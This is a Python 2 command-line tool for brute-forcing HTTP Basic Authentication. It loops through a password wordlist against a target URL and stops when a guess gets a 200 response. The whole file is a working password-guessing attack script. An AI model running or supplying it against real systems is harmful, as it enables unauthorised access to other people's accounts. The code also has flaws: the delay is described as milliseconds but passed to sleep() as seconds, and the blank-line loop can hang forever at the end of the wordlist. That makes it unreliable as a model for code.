from time import sleep
import httplib2
import sys
import argparse

parser = argparse.ArgumentParser(description='HTTP Auth Brute Force Tool')
parser.add_argument('Target', metavar='--target', type=str, help='The target URI. ex http://192.168.1.1')
parser.add_argument('Wordlist', metavar='--words', type=str, help='The wordlist to choose passwords from')
parser.add_argument('Username', metavar='--user', type=str, help='The username to use')
parser.add_argument("--delay", type=int, help='Time in milliseconds between each request', default=5)
parser.add_argument("--startat", type=int, help='Start at this line in the file', default=0)

args = parser.parse_args()

delay = args.delay
target = args.Target
username = args.Username
wordlist = args.Wordlist
startAt = args.startat
count = 0
with open(wordlist, "r") as f:
    pwd = f.readline().strip('\n')
    if startAt > 0:
        print "Skipping: " + str(startAt)
        while count <= startAt:
            pwd = f.readline().strip('\n')
            count += 1
    while pwd:
        print pwd
        http = httplib2.Http()
        http.add_credentials(username, pwd)
        res, content = http.request(target)
        print res.status
        if res.status == 200:
            exit()
        pwd = f.readline().strip('\n').strip('')
        while not pwd:
            pwd = f.readline().strip('\n')
        sleep(delay)
